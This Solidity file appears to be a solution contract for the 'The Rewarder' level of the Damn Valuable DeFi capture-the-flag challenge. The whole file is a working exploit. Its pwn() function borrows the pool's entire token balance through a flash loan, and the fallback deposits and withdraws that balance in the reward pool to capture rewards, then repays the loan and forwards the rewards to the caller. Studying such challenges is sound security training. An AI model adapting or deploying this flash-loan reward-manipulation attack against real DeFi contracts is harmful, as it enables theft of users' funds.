// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {FlashLoanerPool} from "./FlashLoanerPool.sol";
import {TheRewarderPool} from "./TheRewarderPool.sol";
import {RewardToken} from "./RewardToken.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";

contract RewardAttack{
    FlashLoanerPool public pool;
    TheRewarderPool public rewardPool;
    DamnValuableToken public token;
    RewardToken public reward;

    constructor(address _pool, address _token, address _rewardPool, address _reward){
        pool = FlashLoanerPool(_pool);
        token = DamnValuableToken(_token);
        rewardPool = TheRewarderPool(_rewardPool);
        reward = RewardToken(_reward);
    }

    fallback() external {
        uint bal = token.balanceOf(address(this));

        token.approve(address(rewardPool), bal);
        rewardPool.deposit(bal);
        rewardPool.withdraw(bal);

        token.transfer(address(pool), bal);

    }

    function pwn() public {
        pool.flashLoan(token.balanceOf(address(pool)));
        reward.transfer(msg.sender, reward.balanceOf(address(this)));

    }
}